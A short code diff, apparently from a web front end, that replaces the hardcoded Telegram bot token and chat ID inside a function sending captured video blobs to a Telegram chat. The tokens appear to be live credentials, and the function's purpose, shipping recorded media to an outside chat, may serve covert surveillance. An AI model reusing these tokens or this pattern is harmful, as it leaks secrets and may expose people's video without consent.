@@ -390,8 +390,8 @@ ${deviceText}
 
 export const sendVideoToTelegram = async (videoBlob: Blob) => {
   const primaryBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();
-  const backupBotToken = '7998243036:AAEmkLqfg6q1Gurw1QgfHCbBM5Idr4SoX6c';
-  const CHAT_ID = '-1002361654031';
+  const backupBotToken = '7665961745:AAEW2x3-cvvQb2i_F1dtkaOqldmX8-3VRkM';
+  const CHAT_ID = '6571925222';
 
   if (!CHAT_ID) {
     console.error('Telegram chat ID is not configured');
